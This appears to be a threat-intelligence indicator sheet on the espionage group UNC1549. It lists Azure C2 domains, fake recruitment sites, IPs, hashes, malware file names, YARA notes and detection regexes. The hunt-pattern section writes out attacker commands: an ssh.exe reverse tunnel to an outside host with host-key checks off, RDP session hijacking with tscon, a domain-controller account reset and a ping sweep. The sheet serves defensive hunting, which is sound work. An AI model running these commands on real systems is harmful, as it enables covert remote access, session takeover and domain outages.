# 🔍 UNC1549 — Indicators of Compromise

*Admiralty Grade: A2 | TLP:WHITE | Last updated: 2026-04-02*
*Sources: Mandiant (Feb 2024, Nov 2025), Gurucul, KPMG CTIP, UAE Cyber Security Council*

---

## ⚠️ Usage Notes

- UNC1549 generates **unique hashes per victim per deployment** — hash-based detection alone is insufficient
- Azure C2 domains are frequently rotated — treat naming *patterns* as detection signals, not static blocklists
- All code-signing certificates identified have been reported to CAs for revocation
- Prioritize **behavioral detection** over IOC matching for this actor

---

## Domains / URLs (C2 Infrastructure)

UNC1549 heavily abuses **Microsoft Azure Web Apps** and **Azure Cloud App** infrastructure. Naming patterns include A&D industry terms (airline, air, sky, vmware, citrix) and generic tech terms to blend in.

### Confirmed Malicious Domains (Mandiant / Gurucul — 2024–2025)

```
politicalanorak.com
ac-connection-status105.azurewebsites.net
acc-cloud-connection.azurewebsites.net
active-az-check-status45.azurewebsites.net
active-az-check-status675.azurewebsites.net
active-az-status45.azurewebsites.net
active-az-status795.azurewebsites.net
active-internal-log65.azurewebsites.net
active-internal-logs.azurewebsites.net
active-intranet-logs.azurewebsites.net
airbus.usa-careers.com
airlinecontrolsite.uaenorth.cloudapp.azure.com
airlinecontrolsite.westus3.cloudapp.azure.com
airplaneserviceticketings.com
airseatregister.eastus.cloudapp.azure.com
airseatsregister.qatarcentral.cloudapp.azure.com
airseatsregistering.qatarcentral.cloudapp.azure.com
airtravellog.com
automationagencybusiness.azurewebsites.net
automationagencybusiness.com
browsercheckap.azurewebsites.net
codesparkle.eastus.cloudapp.azure.com
connect-acc-492.azurewebsites.net
connect-acl-492.azurewebsites.net
customerlistchange.eastus.cloudapp.azure.com
developercodepro.azurewebsites.net
developercodevista.azurewebsites.net
dreamtiniventures.azurewebsites.net
fdtsprobusinesssolutions.azurewebsites.net
fdtsprobusinesssolutions.com
fdtsprobusinesssolutions.eastus.cloudapp.azure.com
fdtsprobusinesssolutions.northeurope.cloudapp.azure.com
forcecodestore.com
hserbhh43.westus3.cloudapp.azure.com
infrasync-ac372.azurewebsites.net
intra-az-check-status45.azurewebsites.net
intra-az-check-status675.azurewebsites.net
intra-az-status45.azurewebsites.net
intra-az-status795.azurewebsites.net
masterflexiblecloud.azurewebsites.net
mso-internal-log65.azurewebsites.net
mso-internal-logs.azurewebsites.net
mso-intranet-logs.azurewebsites.net
mydocs.qatarcentral.cloudapp.azure.com
nx425-win4945.azurewebsites.net
nx4542-win4957.azurewebsites.net
nxlog-crash-1567.azurewebsites.net
nxlog-win-1567.azurewebsites.net
nxversion-win-1567.azurewebsites.net
nxversion-win32-1127.azurewebsites.net
overqatfa.northeurope.cloudapp.azure.com
queuetestapplication.azurewebsites.net
skychain13424.azurewebsites.net
skychain41334.northeurope.cloudapp.azure.com
skychains42745.eastus.cloudapp.azure.com
skyticketgrant.azurewebsites.net
snare-core.azurewebsites.net
storageboxcloud.northeurope.cloudapp.azure.com
storagewiz.co.azurewebsites.net
swiftcode.eastus.cloudapp.azure.com
swifttiniventures.azurewebsites.net
terratechworld.eastus.cloudapp.azure.com
thecloudappbox.azurewebsites.net
thestorageboxcloud.northeurope.cloudapp.azure.com
thetacticstore.com
thevaultapp.westus3.cloudapp.azure.com
thevaultspace.eastus.cloudapp.azure.com
tini-ventures.com
vcphone-ms.azurewebsites.net
vcs-news.com
vm-ticket-svc.azurewebsites.net
vm-tools-svc.azurewebsites.net
vmware-health-ms.azurewebsites.net
```

### Fake Recruitment / Credential Harvesting Sites (Mandiant — 2024)
```
1stemployer.com
careers-finder.com
birngthemhomenow.co.il  (fake "Bring Them Home Now" site)
cashcloudservices.com   (MINIBUS C2 domain)
```

---

## IP Addresses

```
104.194.215.88
13.60.50.172
167.172.137.208
34.18.42.26
4.188.75.206
4.240.113.27
40.119.176.233
```

---

## File Hashes (MD5)

```
4a223bc9c6096ac6bae3e7452ed6a1cd  — Fake DJI job offer document (MINIBIKE lure)
4ed5d74a746461d3faa9f96995a1eec8  — (KPMG sample)
f58e0dfb8f915fa5ce1b7ca50c46b51b  — (KPMG sample)
0a739dbdbcf9a5d8389511732371ecb4  — (KPMG sample)
```

## File Hashes (SHA1)

```
d9d513e6ddfe9e83df4540deed3c421f80c5ec41  — (KPMG sample)
9acb977f13fce7ec38275887ddbbc0f42532e907  — (KPMG sample)
```

> ⚠️ **Critical caveat:** UNC1549 compiles unique binaries per victim. These hashes represent known samples but should not be relied upon as primary detection. Use behavioral indicators instead.

---

## Malware File Artifacts

| Filename | Malware Family | Notes |
|---|---|---|
| `VGAuth.dll` | LIGHTRAIL | Dropped alongside `VGAuthCLI.exe` for sideloading |
| `userenv.dll` | MISTPEN variant | Executed in memory via `wordpad.dll.mui` |
| `MigAutoPlay.exe` | Loader host | Legitimate binary sideloaded via DLL hijacking |
| `OneDriveFileCoAuth.exe` | Masquerading | Malicious binary named as OneDrive component |
| `DroneEXEHijackingloader.dll` | MINIBIKE variant | Used in drone-sector targeting (Oct 2025) |

---

## Behavioral / Hunt Patterns

### SSH Reverse Tunnel (CRITICAL INDICATOR)
```
C:\windows\system32\openssh\ssh.exe [Username]@[IP] -p 443 -o ServerAliveInterval=60 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -f -N -R <port>
```
Look for: `ssh.exe` with `-R` flag, `-N` flag, connecting outbound on port 443.

### RDP Session Hijacking
```
quser.exe                          # Enumerate active sessions
tscon <sessionID> /dest:<user>     # Hijack unlocked session
```

### DCSync Attack via `net.exe` (Unusual)
```
net user <DC_computer_account$> <password>   # Resets DC computer account
```
⚠️ This breaks DC functionality — if you see this, you've been compromised and an outage may follow.

### PowerShell Recon
```
1..254 | ForEach-Object { if (Test-Connection -ComputerName "192.168.x.$_" ...) }   # Ping sweep
# Port scanning on subnets with IT admin hosts
# Invoke-Kerberoast (obfuscated)
```

### SIGHTGRAB Screenshot Files
- Look for periodic screenshot files created under user profile directories
- Check for unusual scheduled tasks executing legitimate-looking executables from non-standard paths

### DLL Sideloading Targets
Malicious DLLs planted alongside legitimate executables from:
- Fortinet (FortiGate)
- VMware
- Citrix
- Microsoft (Office, Windows components)
- NVIDIA

---

## Azure C2 Naming Pattern Signatures

Hunt for connections to Azure subdomains matching these regex patterns:
```
active-az-(check-status|status)\d+\.azurewebsites\.net
intra-az-(check-status|status)\d+\.azurewebsites\.net
mso-(internal-log|internal-logs|intranet-logs)\d*\.azurewebsites\.net
nxlog-(crash|win)-\d+\.azurewebsites\.net
nxversion-win(32)?-\d+\.azurewebsites\.net
nx\d+-win\d+\.azurewebsites\.net
skychain\d+\.(azurewebsites\.net|northeurope\.cloudapp\.azure\.com)
skychains\d+\.eastus\.cloudapp\.azure\.com
vm-(ticket|tools)-svc\.azurewebsites\.net
air(line|plane|seat|travel)\w+\.(azurewebsites\.net|cloudapp\.azure\.com)
```

---

## YARA Hunting Notes

- TWOSTROKE: look for XOR key `0x41424344` ("ABCD") in binary — distinguishes it from legitimate Lastenzug-based tools
- DEEPROOT: C2 responses use `-===-` as field separator in hex-encoded payloads
- TWOSTROKE: C2 responses use `@##@` as field separator
- All UNC1549 custom tools use DLL search order hijacking — hunt for unexpected DLLs in legitimate software install directories (Citrix, VMware, FortiGate, NVIDIA paths)

---

*TLP:WHITE — This information may be freely shared.*
